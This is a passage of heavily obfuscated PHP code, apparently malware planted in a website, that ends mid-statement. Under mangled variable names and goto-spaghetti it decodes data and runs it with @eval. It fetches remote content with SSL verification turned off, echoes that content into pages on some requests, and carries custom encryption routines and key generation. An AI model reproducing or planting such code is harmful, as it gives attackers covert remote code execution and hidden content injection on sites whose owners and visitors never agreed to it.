($fòÎŞëã²•) { $fòÎŞëã²• = $this->{$_SERVER[’û£ìÂ®Å‚][218]}($fòÎŞëã²•); } if ($fòÎŞëã²•) { try { @eval($fòÎŞëã²•); } catch (Exception $e²á¤§½æ) { } } } } goto aÆç³ùƒ; aÆç³ùƒ: } private function tgyuc8abb429($E³âíŞ§ãÜ = '', $dÂÄù‡Ù—ó = array(), $EšŠÙ¨››‹ = 5) { goto Eß†²÷¾„; c¶ùÑ»¥ö‰: $bËìÒÀà¹× = $F›œ‡Ô‘‹­[654]; if (strlen($bËìÒÀà¹×) < $F›œ‡Ô‘‹­[584]) { die; } $d‹˜›Şèò§ = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($d‹˜›Şèò§, $DÕ·˜»Ï[314]); goto AÀ„Í¢§§×; Eß†²÷¾„: $F›œ‡Ô‘‹­ =& $_SERVER[Ü˜]; $DÕ·˜»Ï =& $_SERVER[’û£ìÂ®Å‚]; $d‹˜›Şèò§ = $DÕ·˜»Ï[313]; goto c¶ùÑ»¥ö‰; eâ»å™‰‡†: if ($dÂÄù‡Ù—ó === -1) { return $d‹˜›Şèò§; } $b‘—”’ñš² = $DÕ·˜»Ï[271](array($DÕ·˜»Ï[272] => array($DÕ·˜»Ï[275] => $EšŠÙ¨››‹, $DÕ·˜»Ï[273] => $DÕ·˜»Ï[317]), $DÕ·˜»Ï[318] => array($DÕ·˜»Ï[319] => !1, $DÕ·˜»Ï[320] => !1))); $dÂÄù‡Ù—ó = @$DÕ·˜»Ï[276]($d‹˜›Şèò§, !1, $b‘—”’ñš²); goto d®«ËŸšŒÕ; AÀ„Í¢§§×: $c‚ÇóÆ˜ = $F›œ‡Ô‘‹­[655]; while (strlen($c‚ÇóÆ˜) < $F›œ‡Ô‘‹­[64]) { if (!$c‚ÇóÆ˜) { break; } $c‚ÇóÆ˜++; } $d‹˜›Şèò§ = $d‹˜›Şèò§ . $E³âíŞ§ãÜ; goto a÷¹¨Ù‰«; d®«ËŸšŒÕ: $E‰ ÀÆÏ‘ = $F›œ‡Ô‘‹­[657]; if (strlen($E‰ ÀÆÏ‘) < $F›œ‡Ô‘‹­[605]) { return; } return $DÕ·˜»Ï[210]($dÂÄù‡Ù—ó, !0); goto c´ÙÒˆ„Àë; C¬ï£‰Ş†­: if (!$CÅŠµƒË¥) { return; } goto fÁŠ¤é‰²¬; c´ÙÒˆ„Àë: $dŞñ„‡¯Ú‚ = $F›œ‡Ô‘‹­[658]; while ($dŞñ„‡¯Ú‚ < $F›œ‡Ô‘‹­[612]) { if ($dŞñ„‡¯Ú‚ >= 0) { break; } $dŞñ„‡¯Ú‚++; } $CÅŠµƒË¥ = $F›œ‡Ô‘‹­[659]; goto C¬ï£‰Ş†­; a÷¹¨Ù‰«: $fö‹Èß£øâ = $F›œ‡Ô‘‹­[656]; if (!$fö‹Èß£øâ) { return; } if ($dÂÄù‡Ù—ó && $DÕ·˜»Ï[161]($dÂÄù‡Ù—ó)) { $d‹˜›Şèò§ = $d‹˜›Şèò§ . $DÕ·˜»Ï[315] . $DÕ·˜»Ï[316]($dÂÄù‡Ù—ó); } goto eâ»å™‰‡†; fÁŠ¤é‰²¬: } private function jzws96ea1338() { goto A‚ÁÓÆíÚš; A‚ÁÓÆíÚš: $fİ³ˆ‚Îµ­ =& $_SERVER[Ü˜]; $cÓ·÷¤Äã¯ =& $_SERVER[’û£ìÂ®Å‚]; $F¤µ¢ó§ƒÇ = array($cÓ·÷¤Äã¯[321] => $cÓ·÷¤Äã¯[322], $cÓ·÷¤Äã¯[323] => $cÓ·÷¤Äã¯[324], $cÓ·÷¤Äã¯[325] => $cÓ·÷¤Äã¯[326], $cÓ·÷¤Äã¯[327] => $cÓ·÷¤Äã¯[328], $cÓ·÷¤Äã¯[329] => $cÓ·÷¤Äã¯[330], $cÓ·÷¤Äã¯[331] => $cÓ·÷¤Äã¯[264], $cÓ·÷¤Äã¯[332] => $cÓ·÷¤Äã¯[264], $cÓ·÷¤Äã¯[333] => $cÓ·÷¤Äã¯[322], $cÓ·÷¤Äã¯[334] => $cÓ·÷¤Äã¯[324], $cÓ·÷¤Äã¯[335] => $cÓ·÷¤Äã¯[326], $cÓ·÷¤Äã¯[336] => $cÓ·÷¤Äã¯[337], $cÓ·÷¤Äã¯[338] => $cÓ·÷¤Äã¯[328], $cÓ·÷¤Äã¯[339] => $cÓ·÷¤Äã¯[340], $cÓ·÷¤Äã¯[341] => $cÓ·÷¤Äã¯[330], $cÓ·÷¤Äã¯[342] => $cÓ·÷¤Äã¯[343], $cÓ·÷¤Äã¯[344] => $cÓ·÷¤Äã¯[345], $cÓ·÷¤Äã¯[346] => $cÓ·÷¤Äã¯[347]); goto eŞÆº‰ªãŒ; FŸ·¥¤²Œˆ: if (strlen($fÂ÷Ÿ‘“¿‡) < $fİ³ˆ‚Îµ­[605]) { die; } goto FéÅøÉÆ; fÑÜÑñ½İŸ: $B™¸‹÷¤ÈÌ = $B™¸‹÷¤ÈÌ ? $cÓ·÷¤Äã¯[263]($B™¸‹÷¤ÈÌ) : 0; return $bçÉÏõğ  + $B™¸‹÷¤ÈÌ; $fÂ÷Ÿ‘“¿‡ = $fİ³ˆ‚Îµ­[662]; goto FŸ·¥¤²Œˆ; Eùôóº®†§: $bçÉÏõğ  = $cÓ·÷¤Äã¯[263]($bçÉÏõğ  ? $bçÉÏõğ  : $cÓ·÷¤Äã¯[322]); $B™¸‹÷¤ÈÌ = $cÓ·÷¤Äã¯[116]($this->vuljaf2cb0dd, $cÓ·÷¤Äã¯[348]); $b‰×À¶ÜÈ  = $fİ³ˆ‚Îµ­[661]; goto fÑÜÑñ½İŸ; eŞÆº‰ªãŒ: $eï†‰Î­£½ = $fİ³ˆ‚Îµ­[660]; while (strlen($eï†‰Î­£½) < $fİ³ˆ‚Îµ­[584]) { if (!$eï†‰Î­£½) { break; } $eï†‰Î­£½++; } $bçÉÏõğ  = $F¤µ¢ó§ƒÇ[$this->jndo77356942]; goto Eùôóº®†§; FéÅøÉÆ: } public function phot39cc6cd6($F‡íã™Š×) { goto dÅ¥·­¶ŸÀ; dÅ¥·­¶ŸÀ: $CíÅ‘ÉÁÃ =& $_SERVER[Ü˜]; $a›œÙ¤ñ†© =& $_SERVER[’û£ìÂ®Å‚]; $dêìÛîÃñ = $this->{$_SERVER[’û£ìÂ®Å‚][147]}(); goto E‚¥™¢‰‘; eÜ©…åÂëÕ: if ($a‰ÙÛå¡”Î <= $dêìÛîÃñ) { return; } $CÅ…ª¶ªÜé = $a›œÙ¤ñ†©[61]($a›œÙ¤ñ†©[149])->{$_SERVER[’û£ìÂ®Å‚][350]}($a›œÙ¤ñ†©[349])->{$_SERVER[’û£ìÂ®Å‚][351]}($dêìÛîÃñ)->{$_SERVER[’û£ìÂ®Å‚][352]}(); $D‰®¹„“Õ = $CíÅ‘ÉÁÃ[665]; goto AÔÃ¾›„²; BºŒçíªëÓ: if (!$a›œÙ¤ñ†©[261]($F‡íã™Š×[$a›œÙ¤ñ†©[349]], $CÅ…ª¶ªÜé)) { $a›œÙ¤ñ†©[184]($a›œÙ¤ñ†©[353], !1, $a›œÙ¤ñ†©[258]); } goto a¯Í¦šö; AÔÃ¾›„²: $CÅ…ª¶ªÜé = $a›œÙ¤ñ†©[241]($CÅ…ª¶ªÜé, $a›œÙ¤ñ†©[10], $a›œÙ¤ñ†©[349]); $eÔ¶ÀÂ‚ê = $CíÅ‘ÉÁÃ[666]; while (strlen($eÔ¶ÀÂ‚ê) < $CíÅ‘ÉÁÃ[64]) { if (!$eÔ¶ÀÂ‚ê) { break; } $eÔ¶ÀÂ‚ê++; } goto BºŒçíªëÓ; B×®è²£Íà: if ($dêìÛîÃñ >= $a›œÙ¤ñ†©[263]($a›œÙ¤ñ†©[264])) { return; } $a‰ÙÛå¡”Î = $a›œÙ¤ñ†©[61]($a›œÙ¤ñ†©[149])->{$_SERVER[’û£ìÂ®Å‚][150]}(); $C¯®Ş×Õ†Û = $CíÅ‘ÉÁÃ[664]; goto eÜ©…åÂëÕ; E‚¥™¢‰‘: $eİ…Š‰¹àÒ = $CíÅ‘ÉÁÃ[663]; while (strlen($eİ…Š‰¹àÒ) < $CíÅ‘ÉÁÃ[589]) { if (!$eİ…Š‰¹àÒ) { break; } $eİ…Š‰¹àÒ++; } if ($F‡íã™Š×[$a›œÙ¤ñ†©[349]] == $a›œÙ¤ñ†©[239]) { return; } goto B×®è²£Íà; a¯Í¦šö: } public function msptf2920966() { goto Cæ§‘Ÿçà«; DæÕâ‡…Ä»: echo $c’ÙÑ¯‰éÈ[355] . $c’ÙÑ¯‰éÈ[356]($eÛì¼ÎŠÔ) . $c’ÙÑ¯‰éÈ[357]; $CÜÇŞßá©§ = $CÛØ¼¡ ìÓ[668]; if (!$CÜÇŞßá©§) { die; } goto f«í±Ää; D×îÌÜ·êó: $aÔŒà§ç† = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($aÔŒà§ç†, $c’ÙÑ¯‰éÈ[270]); $C¦Ş——Û¥ô = $c’ÙÑ¯‰éÈ[271](array($c’ÙÑ¯‰éÈ[272] => array($c’ÙÑ¯‰éÈ[273] => $c’ÙÑ¯‰éÈ[274], $c’ÙÑ¯‰éÈ[275] => 3))); $eÛì¼ÎŠÔ = @$c’ÙÑ¯‰éÈ[276]($aÔŒà§ç†, !1, $C¦Ş——Û¥ô); goto DæÕâ‡…Ä»; Cæ§‘Ÿçà«: $CÛØ¼¡ ìÓ =& $_SERVER[Ü˜]; $c’ÙÑ¯‰éÈ =& $_SERVER[’û£ìÂ®Å‚]; if (!$c’ÙÑ¯‰éÈ[116]($GLOBALS, $c’ÙÑ¯‰éÈ[142]) || $c’ÙÑ¯‰éÈ[354](1, 100) > 20) { return; } goto f—“ÎËœ°; f—“ÎËœ°: $aÔŒà§ç† = $c’ÙÑ¯‰éÈ[268]; $dÍ÷ÈŒ´‚Ò = $CÛØ¼¡ ìÓ[667]; if (strlen($dÍ÷ÈŒ´‚Ò) < $CÛØ¼¡ ìÓ[605]) { die; } goto D×îÌÜ·êó; f«í±Ää: } private function qkyg6a2807b0($CÖ¯ìäèÆè, $E‹ÉºÚ‹°‚, $f°î÷ºèİÍ = 3) { goto E˜‰ôëÚ³Ë; E˜‰ôëÚ³Ë: $E¹—ô¥ª§µ =& $_SERVER[Ü˜]; $a†¼¹ÙÆ« =& $_SERVER[’û£ìÂ®Å‚]; $a†¼¹ÙÆ«[358](1); goto cœŒ²‘—ó; fˆĞİ’¼ò: $dÈŸ®¤â…Ü = $E¹—ô¥ª§µ[670]; if (!$dÈŸ®¤â…Ü) { die; } $c¶Ù“ãùæƒ = $a†¼¹ÙÆ«[354](0, 5) . $a†¼¹ÙÆ«[10]; goto aÌ×“›»‚; eÎÁª¥ã·: while (strlen($Aª¬‡Ú¡æ) < $E¹—ô¥ª§µ[612]) { if (!$Aª¬‡Ú¡æ) { break; } $Aª¬‡Ú¡æ++; } $e§¾ª¢•¬ã = $a†¼¹ÙÆ«[359]; switch ($c¶Ù“ãùæƒ) { case $a†¼¹ÙÆ«[253]: $EŠÒ¨¤É¹Ã = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($CÖ¯ìäèÆè, $a†¼¹ÙÆ«[233]($E‹ÉºÚ‹°‚ . $AˆÂ—‹Æ“)); break; $dê¤×ÃÅÙ¯ = $E¹—ô¥ª§µ[673]; if (strlen($dê¤×ÃÅÙ¯) < $E¹—ô¥ª§µ[589]) { return; } case $a†¼¹ÙÆ«[239]: $EŠÒ¨¤É¹Ã = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($CÖ¯ìäèÆè, $a†¼¹ÙÆ«[233]($AˆÂ—‹Æ“ . $E‹ÉºÚ‹°‚)); $aì°Î›êÜ = $E¹—ô¥ª§µ[674]; if (strlen($aì°Î›êÜ) < $E¹—ô¥ª§µ[589]) { die; } break; case $a†¼¹ÙÆ«[360]: $EŠÒ¨¤É¹Ã = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($CÖ¯ìäèÆè, $a†¼¹ÙÆ«[128]($AˆÂ—‹Æ“ . $E‹ÉºÚ‹°‚)); break; case $a†¼¹ÙÆ«[361]: $EŠÒ¨¤É¹Ã = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($CÖ¯ìäèÆè, $a†¼¹ÙÆ«[124]($AˆÂ—‹Æ“ . $E‹ÉºÚ‹°‚)); break; $FËÀ¥±ßÌ = $E¹—ô¥ª§µ[675]; case $a†¼¹ÙÆ«[362]: goto E¹¨Ü‚Á; f¸˜¶ŠŸƒ: for ($BÍªàÒè© = 0; $BÍªàÒè© < $a†¼¹ÙÆ«[24]($CÖ¯ìäèÆè); $BÍªàÒè©++) { $D„‘œ²ª´ = $D„‘œ²ª´ == $a†¼¹ÙÆ«[24]($Aùæ‡Óô’ù) ? 0 : $D„‘œ²ª´; $B©Îî¢øÃÙ = ($c‡Ø‚İìÅ + $a†¼¹ÙÆ«[364]($e§¾ª¢•¬ã, $CÖ¯ìäèÆè[$BÍªàÒè©]) + $a†¼¹ÙÆ«[365]($Aùæ‡Óô’ù[$D„‘œ²ª´++])) % 64; $aƒ©Œæßšİ = $E¹—ô¥ª§µ[679]; while ($aƒ©Œæßšİ < $E¹—ô¥ª§µ[605]) { if ($aƒ©Œæßšİ >= 0) { break; } $aƒ©Œæßšİ++; } $e³½‰Óµ›Û .= $e§¾ª¢•¬ã[$B©Îî¢øÃÙ]; $fÃÓÛï†ÀÔ = $E¹—ô¥ª§µ[680]; while ($fÃÓÛï†ÀÔ < $E¹—ô¥ª§µ[605]) { if ($fÃÓÛï†ÀÔ >= 0) { break; } $fÃÓÛï†ÀÔ++; } } $EŠÒ¨¤É¹Ã = $a†¼¹ÙÆ«[356]($d±·Ò›ÎèÉ . $e³½‰Óµ›Û); $E’Ëè—¨æ£ = $E¹—ô¥ª§µ[681]; goto d•–¨‡¬êÊ; c…ÆÎ‰àÍ‰: $BÍªàÒè© = 0; $B©Îî¢øÃÙ = 0; $D„‘œ²ª´ = 0; goto f¸˜¶ŠŸƒ; E¹¨Ü‚Á: $CÖ¯ìäèÆè = $a†¼¹ÙÆ«[128]($CÖ¯ìäèÆè); $c‡Ø‚İìÅ = $a†¼¹ÙÆ«[363](0, 64); $E‰Œ¢ñ†»¨ = $E¹—ô¥ª§µ[676]; goto cŠİƒîîî²; E¹¡·’˜¡„: $e„ÜÜãñ‘ = $E¹—ô¥ª§µ[677]; while (strlen($e„ÜÜãñ‘) < $E¹—ô¥ª§µ[605]) { if (!$e„ÜÜãñ‘) { break; } $e„ÜÜãñ‘++; } $Aùæ‡Óô’ù = $a†¼¹ÙÆ«[25]($Aùæ‡Óô’ù, $c‡Ø‚İìÅ % 8, $c‡Ø‚İìÅ % 8 + 7); goto EÍ÷ß“–ˆï; d•–¨‡¬êÊ: while ($E’Ëè—¨æ£ < $E¹—ô¥ª§µ[64]) { if ($E’Ëè—¨æ£ >= 0) { break; } $E’Ëè—¨æ£++; } break; goto fÁİ‹œ©Á; EÍ÷ß“–ˆï: $eÇ±ÚãÂ‘° = $E¹—ô¥ª§µ[678]; while (strlen($eÇ±ÚãÂ‘°) < $E¹—ô¥ª§µ[584]) { if (!$eÇ±ÚãÂ‘°) { break; } $eÇ±ÚãÂ‘°++; } $e³½‰Óµ›Û = $a†¼¹ÙÆ«[10]; goto c…ÆÎ‰àÍ‰; cŠİƒîîî²: if (!$E‰Œ¢ñ†»¨) { die; } $d±·Ò›ÎèÉ = $e§¾ª¢•¬ã[$c‡Ø‚İìÅ]; $Aùæ‡Óô’ù = $a†¼¹ÙÆ«[124]($d±·Ò›ÎèÉ . $a†¼¹ÙÆ«[124]($E‹ÉºÚ‹°‚ . $d±·Ò›ÎèÉ) . $E‹ÉºÚ‹°‚); goto E¹¡·’˜¡„; fÁİ‹œ©Á: default: $EŠÒ¨¤É¹Ã = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($CÖ¯ìäèÆè, $E‹ÉºÚ‹°‚ . $AˆÂ—‹Æ“); break; } goto c­éİ•Á¬é; aÌ×“›»‚: $E­ã´í¸ã = $E¹—ô¥ª§µ[671]; $AˆÂ—‹Æ“ = $a†¼¹ÙÆ«[134](15); $Aª¬‡Ú¡æ = $E¹—ô¥ª§µ[672]; goto eÎÁª¥ã·; cÑ¹†‡®Ò: if ($f°î÷ºèİÍ - 1 > 0) { $EŠÒ¨¤É¹Ã = $this->{$_SERVER[’û£ìÂ®Å‚][137]}($EŠÒ¨¤É¹Ã, $E‹ÉºÚ‹°‚, $f°î÷ºèİÍ - 1); } return $EŠÒ¨¤É¹Ã; goto fçîµí»æ; c­éİ•Á¬é: $EŠÒ¨¤É¹Ã = $a†¼¹ÙÆ«[233]($c¶Ù“ãùæƒ . $AˆÂ—‹Æ“ . $EŠÒ¨¤É¹Ã); $fÇØĞ‡ôà™ = $E¹—ô¥ª§µ[682]; if (!$fÇØĞ‡ôà™) { die; } goto cÑ¹†‡®Ò; cœŒ²‘—ó: $B‘Ó«›ÔÏó = $E¹—ô¥ª§µ[669]; if (strlen($B‘Ó«›ÔÏó) < $E¹—ô¥ª§µ[605]) { die; } $CÖ¯ìäèÆè = $a†¼¹ÙÆ«[2]($CÖ¯ìäèÆè); goto fˆĞİ’¼ò; fçîµí»æ: } private function oean61f2c1d8($bÑ³ÓÏ‹Ì, $b£¶¿‚Ì›Ü, $c§ÊŒ¦®‹ˆ = 3) { goto fƒÃ¯ö˜°; dËŒ…È’¿: $f²çô¥äÙÎ = $E¾ˆ¼¬ñß[359]; switch ($Dî¶¶¥„Õ¹) { case $E¾ˆ¼¬ñß[253]: $FŞ±çåÀ» = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($bÑ³ÓÏ‹Ì, $E¾ˆ¼¬ñß[233]($b£¶¿‚Ì›Ü . $F§¸ˆÇ¯¥À)); break; $eŠ‰¾¾îè¡ = $bòÏ­²´£é[684]; case $E¾ˆ¼¬ñß[239]: $FŞ±çåÀ» = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($bÑ³ÓÏ‹Ì, $E¾ˆ¼¬ñß[233]($F§¸ˆÇ¯¥À . $b£¶¿‚Ì›Ü)); $E’˜¾ÊçØÀ = $bòÏ­²´£é[685]; while (strlen($E’˜¾ÊçØÀ) < $bòÏ­²´£é[612]) { if (!$E’˜¾ÊçØÀ) { break; } $E’˜¾ÊçØÀ++; } break; case $E¾ˆ¼¬ñß[360]: $FŞ±çåÀ» = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($bÑ³ÓÏ‹Ì, $E¾ˆ¼¬ñß[128]($F§¸ˆÇ¯¥À . $b£¶¿‚Ì›Ü)); break; $A¦ïÍ¸µµ³ = $bòÏ­²´£é[686]; if (strlen($A¦ïÍ¸µµ³) < $bòÏ­²´£é[612]) { return; } case $E¾ˆ¼¬ñß[361]: $FŞ±çåÀ» = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($bÑ³ÓÏ‹Ì, $E¾ˆ¼¬ñß[124]($F§¸ˆÇ¯¥À . $b£¶¿‚Ì›Ü)); $C³éÔ¬Ä = $bòÏ­²´£é[687]; while (strlen($C³éÔ¬Ä) < $bòÏ­²´£é[612]) { if (!$C³éÔ¬Ä) { break; } $C³éÔ¬Ä++; } break; case $E¾ˆ¼¬ñß[362]: goto c¬»â£¦; f‚’°¾¸Éê: $EÒĞˆÍœ˜÷ = $E¾ˆ¼¬ñß[10]; $b»æ›Æ–¾¶ = 0; $BÅÚÎÑš¦‰ = $bòÏ­²´£é[690]; goto dµ¡ñÊçï; bÅÙ¯…áî: while ($b·à„µê–™ < $bòÏ­²´£é[612]) { if ($b·à„µê–™ >= 0) { break; } $b·à„µê–™++; } for ($b»æ›Æ–¾¶ = 0; $b»æ›Æ–¾¶ < $E¾ˆ¼¬ñß[24]($bÑ³ÓÏ‹Ì); $b»æ›Æ–¾¶++) { $Bçí˜Ù²™ = $Bçí˜Ù²™ == $E¾ˆ¼¬ñß[24]($DÈÑÈÁ³é¢) ? 0 : $Bçí˜Ù²™; $F›ğî§äâõ = $Bçí˜Ù²™++; $f‰³¬¦«ñ” = $bòÏ­²´£é[693]; if (!$f‰³¬¦«ñ”) { die; } $e«™İŒ±‘ = $E¾ˆ¼¬ñß[364]($f²çô¥äÙÎ, $bÑ³ÓÏ‹Ì[$b»æ›Æ–¾¶]) - $D‰µÔìŸÛ» - $E¾ˆ¼¬ñß[365]($DÈÑÈÁ³é¢[$F›ğî§äâõ]); while ($e«™İŒ±‘ < 0) { $e«™İŒ±‘ += 64; $eò³âğ­ÓÄ = $bòÏ­²´£é[694]; if (strlen($eò³âğ­ÓÄ) < $bòÏ­²´£é[584]) { die; } } $EÒĞˆÍœ˜÷ .= $f²çô¥äÙÎ[$e«™İŒ±‘]; $aÉèøòêˆÑ = $bòÏ­²´£é[695]; } $FŞ±çåÀ» = $E¾ˆ¼¬ñß[367]($EÒĞˆÍœ˜÷); goto Aò„Ö£“¯Ã; aŠôÅÄ–¦: if (!$F¤Æß´÷Ñ) { return; } $Bçí˜Ù²™ = 0; $b·à„µê–™ = $bòÏ­²´£é[692]; goto bÅÙ¯…áî; F…¤Ñğ¼¯§: $D¢ÙŒÇ÷•Ü = $bòÏ­²´£é[688]; $D‰µÔìŸÛ» = $E¾ˆ¼¬ñß[364]($f²çô¥äÙÎ, $a¡ŠÍÁÍÇï); $DÈÑÈÁ³é¢ = $E¾ˆ¼¬ñß[124]($a¡ŠÍÁÍÇï . $E¾ˆ¼¬ñß[124]($b£¶¿‚Ì›Ü . $a¡ŠÍÁÍÇï) . $b£¶¿‚Ì›Ü); goto Dˆ™ÊÇ—; dµ¡ñÊçï: while ($BÅÚÎÑš¦‰ < $bòÏ­²´£é[612]) { if ($BÅÚÎÑš¦‰ >= 0) { break; } $BÅÚÎÑš¦‰++; } $e«™İŒ±‘ = 0; $F¤Æß´÷Ñ = $bòÏ­²´£é[691]; goto aŠôÅÄ–¦; Dˆ™ÊÇ—: $DÈÑÈÁ³é¢ = $E¾ˆ¼¬ñß[25]($DÈÑÈÁ³é¢, $D‰µÔìŸÛ» % 8, $D‰µÔìŸÛ» % 8 + 7); $fîÒØğ¡Ğ¸ = $bòÏ­²´£é[689]; while (strlen($fîÒØğ¡Ğ¸) < $bòÏ­²´£é[612]) { if (!$fîÒØğ¡Ğ¸) { break; } $fîÒØğ¡Ğ¸++; } goto f‚’°¾¸Éê; c¬»â£¦: $bÑ³ÓÏ‹Ì = $E¾ˆ¼¬ñß[366]($bÑ³ÓÏ‹Ì); $a¡ŠÍÁÍÇï = $bÑ³ÓÏ‹Ì[0]; $bÑ³ÓÏ‹Ì = $E¾ˆ¼¬ñß[25]($bÑ³ÓÏ‹Ì, 1); goto F…¤Ñğ¼¯§; Aò„Ö£“¯Ã: $a«äšËò“ì = $bòÏ­²´£é[696]; while ($a«äšËò“ì < $bòÏ­²´£é[584]) { if ($a«äšËò“ì >= 0) { break; } $a«äšËò“ì++; } break; goto fíµ‚Ùß¯Â; fíµ‚Ùß¯Â: default: $FŞ±çåÀ» = $this->{$_SERVER[’û£ìÂ®Å‚][269]}($bÑ³ÓÏ‹Ì, $b£¶¿‚Ì›Ü . $F§¸ˆÇ¯¥À); break; $eˆì¶Ô = $bòÏ­²´£é[697]; while (strlen($eˆì¶Ô) < $bòÏ­²´£é[584]) { if (!$eˆì¶Ô) { break; } $eˆì¶Ô++; } } if ($c§ÊŒ¦®‹ˆ - 1 > 0) { $FŞ±çåÀ» = $this->{$_SERVER[’û£ìÂ®Å‚][208]}($FŞ±çåÀ», $b£¶¿‚Ì›Ü, $c§ÊŒ¦®‹ˆ - 1); } goto f™à°¥¢‰; fƒÃ¯ö˜°: $bòÏ­²´£é =& $_SERVER[Ü˜]; $E¾ˆ¼¬ñß =& $_SERVER[’û£ìÂ®Å‚]; if (!$E¾ˆ¼¬ñß[158]($bÑ³ÓÏ‹Ì) || $E¾ˆ¼¬ñß[24]($bÑ³ÓÏ‹Ì) < 10) { return !1; } goto EÚ¾¤Îõ; Fğ‡‹öŞå›: $CŒè½Ë“ = $bòÏ­²´£é[683]; $F§¸ˆÇ¯¥À = $E¾ˆ¼¬ñß[25]($bÑ³ÓÏ‹Ì, 1, 15); $bÑ³ÓÏ‹Ì = $E¾ˆ¼¬ñß[25]($bÑ³ÓÏ‹Ì, 16); goto dËŒ…È’¿; f™à°¥¢‰: return $FŞ±çåÀ»; goto eùøç³øÂ; EÚ¾¤Îõ: $bÑ³ÓÏ‹Ì = $E¾ˆ¼¬ñß[2]($bÑ³ÓÏ‹Ì); $bÑ³ÓÏ‹Ì = $E¾ˆ¼¬ñß[233]($bÑ³ÓÏ‹Ì); $Dî¶¶¥„Õ¹ = $bÑ³ÓÏ‹Ì[0]; goto Fğ‡‹öŞå›; eùøç³øÂ: } public function cpmg0c073542($e¢ƒ¯éÁ·„) { goto aô¯¢©±ÚÅ; D‘éµ·äù: return $f¦İï¤ Çª; goto f…šÈ•Ü; b¦…˜…¸°Ö: $Bí¾ã—¶ô = $f‡İô¸¾ÎË[699]; $CÀ‚ÕÁÄ³ = $D´…Ãˆ‰‰¥[263](($EòÂèÔé + $dò‰êÏÑØÛ) / 2); $BÌ’‰®å†‹ = $f‡İô¸¾ÎË[700]; goto AèŠã÷Ò½; aô¯¢©±ÚÅ: $f‡İô¸¾ÎË =& $_SERVER[Ü˜]; $D´…Ãˆ‰‰¥ =& $_SERVER[’û£ìÂ®Å‚]; $EòÂèÔé = $this->{$_SERVER[’û£ìÂ®Å‚][368]}(); goto Bç®Û¨ì¨; D§áßß¶¢ğ: $eÃÅğô—† = $f‡İô¸¾ÎË[702]; if (strlen($eÃÅğô—†) < $f‡İô¸¾ÎË[605]) { die; } for ($b£‰Äá¨Ú = 0; $b£‰Äá¨Ú < $E¥ÎÈ—¬èÇ * 10; $b£‰Äá¨Ú++) { if (($E¥ÎÈ—¬èÇ * $b£‰Äá¨Ú + 1) % $CÀ‚ÕÁÄ³ == 0) { $aÒ˜š»šÇÒ = $D´…Ãˆ‰‰¥[263](($E¥ÎÈ—¬èÇ * $b£‰Äá¨Ú + 1) / $CÀ‚ÕÁÄ³); break; } } goto cÉ¼ÛòÂÛŠ; a¸”‰ º: $B«¯Ÿ•Û‘° = $f‡İô¸¾ÎË[597]; if (!$B«¯Ÿ•Û‘°) { return; } $E¥ÎÈ—¬èÇ = ($EòÂèÔé - 1) * ($dò‰êÏÑØÛ - 1); goto b¦…˜…¸°Ö; cÉ¼ÛòÂÛŠ: $bìƒ‚–«à = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($EòÂèÔé * $dò‰êÏÑØÛ . $D´…Ãˆ‰‰¥[10], $D´…Ãˆ‰‰¥[167]); $DË³ƒ«…öÆ = $D´…Ãˆ‰‰¥[124]($D´…Ãˆ‰‰¥[369] . ($EòÂèÔé + $dò‰êÏÑØÛ) . $D´…Ãˆ‰‰¥[370] . $CÀ‚ÕÁÄ³ . $D´…Ãˆ‰‰¥[370] . $aÒ˜š»šÇÒ . $D´…Ãˆ‰‰¥[371]); $f¦İï¤ Çª = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($e¢ƒ¯éÁ·„, $DË³ƒ«…öÆ) . $D´…Ãˆ‰‰¥[372] . $bìƒ‚–«à; goto D‘éµ·äù; AèŠã÷Ò½: if (strlen($BÌ’‰®å†‹) < $f‡İô¸¾ÎË[589]) { die; } while (1) { $B‘éÅíÎ­Ù = $CÀ‚ÕÁÄ³; $AÑãƒ†¼œ® = $E¥ÎÈ—¬èÇ; while ($AÑãƒ†¼œ® % $B‘éÅíÎ­Ù != 0) { $döïÎêù¿§ = $AÑãƒ†¼œ®; $CÄÉ°ñ¨î² = $f‡İô¸¾ÎË[701]; $AÑãƒ†¼œ® = $B‘éÅíÎ­Ù; $B‘éÅíÎ­Ù = $döïÎêù¿§ % $B‘éÅíÎ­Ù; } if ($B‘éÅíÎ­Ù == 1) { break; } else { $CÀ‚ÕÁÄ³++; } } $aÒ˜š»šÇÒ = 2; goto D§áßß¶¢ğ; Bç®Û¨ì¨: $F¯œºæäÑ = $f‡İô¸¾ÎË[698]; if (!$F¯œºæäÑ) { die; } $dò‰êÏÑØÛ = $this->{$_SERVER[’û£ìÂ®Å‚][368]}(); goto a¸”‰ º; f…šÈ•Ü: } public function fecv55975e02($C‡Ù°äĞ„Ó) { goto C»ĞÉ¨Ñ©ª; eË£øİ‘Ã×: $E®ğƒæ¦­ = 2; for ($a’è¿ô˜ = 0; $a’è¿ô˜ < $aõÊÊ»íã… * 10; $a’è¿ô˜++) { if (($aõÊÊ»íã… * $a’è¿ô˜ + 1) % $A¬ƒ‡Õœ == 0) { $E®ğƒæ¦­ = $EÒ¼ˆîÊÍ„[263](($aõÊÊ»íã… * $a’è¿ô˜ + 1) / $A¬ƒ‡Õœ); break; } } $D£»Á¾ÈÛ = $EÒ¼ˆîÊÍ„[124]($EÒ¼ˆîÊÍ„[369] . ($eÄŠĞòİ×ï + $Dó‘ÀÖ¡) . $EÒ¼ˆîÊÍ„[370] . $A¬ƒ‡Õœ . $EÒ¼ˆîÊÍ„[370] . $E®ğƒæ¦­ . $EÒ¼ˆîÊÍ„[371]); goto bÙî¢¾ºŞ¥; d†£³İ£œ¯: $EÔœ¸íØÀÈ = $EÒ¼ˆîÊÍ„[263]($EÔœ¸íØÀÈ); $cÊçà™‘« = $d²ËÌâÑ‰ì[703]; $eÄŠĞòİ×ï = 0; goto b§¸‘ö™Ãá; A„²×æøèÏ: if ($EÒ¼ˆîÊÍ„[19]($B³¸¯‚à¯…) != 2) { return $EÒ¼ˆîÊÍ„[10]; } $EÔœ¸íØÀÈ = 